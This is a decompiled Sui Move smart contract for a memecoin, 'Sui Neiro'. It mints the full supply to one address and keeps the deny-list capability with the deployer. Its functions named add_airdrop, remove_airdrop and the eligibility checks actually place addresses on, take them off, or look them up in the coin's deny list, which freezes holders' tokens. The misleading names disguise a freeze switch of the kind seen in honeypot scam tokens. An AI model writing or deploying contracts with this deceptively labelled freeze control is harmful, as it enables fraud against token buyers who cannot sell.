module 0x5e0da3ab5ad35707d9a78456bcff63f5355c59798359877287decd03c8c1c1e5::neiro {
    struct NEIRO has drop {
        dummy_field: bool,
    }

    public fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<NEIRO>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_add<NEIRO>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    public fun calculate_eligibility<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : (bool, u64, u8) {
        (0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1), 1000000000000000000, 9)
    }

    public fun check_eligibility<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : bool {
        0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1)
    }

    fun init(arg0: NEIRO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<NEIRO>(arg0, 9, b"Sui Neiro", b"SUINEIRO", b"Neiro is a Suimemecoin combining Neiro token's community-driven approach with the popular Shiba Inu dog meme", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://orange-upper-booby-780.mypinata.cloud/ipfs/QmbZqfdHARmLK2iHJVvkgLPc5fJZeGiv4kekXQasRUMC8i"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<NEIRO>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<NEIRO>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<NEIRO>(&mut v3, 1000000000000000000, @0x7ef8ec1a71b7a812a56b32e5608d3db29a32da269a9256ae44427f80d5f9cce8, arg1);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<NEIRO>>(v3);
    }

    public fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<NEIRO>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_remove<NEIRO>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    // decompiled from Move bytecode v6
}

